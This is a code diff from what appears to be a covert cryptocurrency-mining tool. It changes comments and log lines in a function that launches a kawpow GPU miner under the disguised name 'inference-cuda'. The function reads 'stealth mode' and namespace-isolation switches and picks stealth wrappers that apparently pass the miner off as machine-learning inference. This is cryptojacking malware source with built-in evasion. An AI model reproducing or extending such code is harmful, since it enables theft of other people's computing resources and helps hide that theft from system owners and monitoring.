@@ -504,10 +504,10 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
         logger.info(f"🎮 GPU Mining - CUDA loader: {cuda_loader}")
         logger.info(f"🎮 GPU Mining - Loader exists: {os.path.exists(cuda_loader)}")
         
-        # 🎯 PRODUCTION: Use GPU-optimized KawPoW algorithm for inference-cuda
-        # Fixed: Restore kawpow algorithm for proper GPU mining operation
+        # 🎯 CORRECT: Use CUDA backend với kawpow algorithm cho inference-cuda
+        # inference-cuda được thiết kế cho CUDA, không phải OpenCL
         mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])
-        logger.info(f"🎮 GPU Mining - Using kawpow algorithm for GPU mining")
+        logger.info(f"🎮 GPU Mining - CORRECT: Using CUDA backend với kawpow algorithm cho inference-cuda")
 
     enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
     enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
@@ -537,7 +537,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                         "mining_environment", "stealth", "wrappers", "stealth_ml_inference.py"
                     )
                 else:
-                    # **GPU Stealth Wrapper** (wrapper ẩn danh GPU) 
+                    # **GPU Stealth Wrapper** (wrapper ẩn danh GPU) - RESTORED: Use correct inference-cuda wrapper
                     stealth_wrapper_path = os.path.join(
                         os.path.dirname(os.path.abspath(__file__)),
                         "mining_environment", "stealth", "wrappers", "stealth_inference_cuda.py"
